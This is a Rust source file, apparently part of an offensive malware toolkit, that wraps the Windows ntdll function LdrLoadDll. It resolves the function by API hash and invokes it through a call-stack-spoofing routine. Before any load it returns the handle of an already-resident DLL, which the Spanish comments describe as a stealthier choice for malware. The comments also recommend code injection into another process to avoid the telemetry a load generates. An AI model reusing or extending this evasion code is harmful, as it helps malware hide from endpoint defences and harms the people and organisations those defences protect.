use crate::nt::types::*;
use crate::techniques::evasion::api_hashing::unique_hash;
use crate::techniques::evasion::execution::user_mode_call::user_mode_call_with_spoof;
use crate::techniques::evasion::dinamic_api_resolution::*;

//https://ntdoc.m417z.com/ldrloaddll

//implementar esta funcion para cargar una dll no es una buena practica en malware dado que genera mucha telemetria, lo suyo seria inyectar codigo a un proceso que ya tenga cargada la dll y asi no haces loadlibrary
// OJOOO: esta funcionn he añadido ahora que si la dll ya esta cargada en memoria, que te devuelva el handle directamente, no llamara el loadlibrary (es un poco mas stealthy)
pub fn ldr_load_dll(
    //llamada a el loader de dlls de windows
    dll_path: PCWSTR,            //in_opt
    dll_characteristics: PULONG, //in_opt
    dll_name: PCUNICODE_STRING,  //in
    dll_handle: PHANDLE,         //out
) -> Result<usize, String> {

    if let Some(name_ref) = unsafe { dll_name.as_ref() } {
        let name = name_ref.to_string();
        if let Ok(handle) = unsafe { get_dll_base_by_hash(unique_hash(&name.to_lowercase())) } {
            if !dll_handle.is_null() {
                unsafe {
                    *dll_handle = handle as HANDLE;
                }
            }
            return Ok(0);
        }
    }

    let api_hash = 0x5338cf9d;
    let ntdll = unsafe { get_ntdll_base()? };

    let status = user_mode_call_with_spoof(
        ntdll,
        api_hash,
        dll_path as usize,
        dll_characteristics as usize,
        dll_name as usize,
        dll_handle as usize,
        0,
        0,
        0,
        0,
    );

    match status {
        Ok(0) => Ok(0),
        Ok(code) => Err(format!("ldr_load_dll devolvió NTSTATUS: {:#X}", code)),
        Err(e) => Err(e),
    }
}
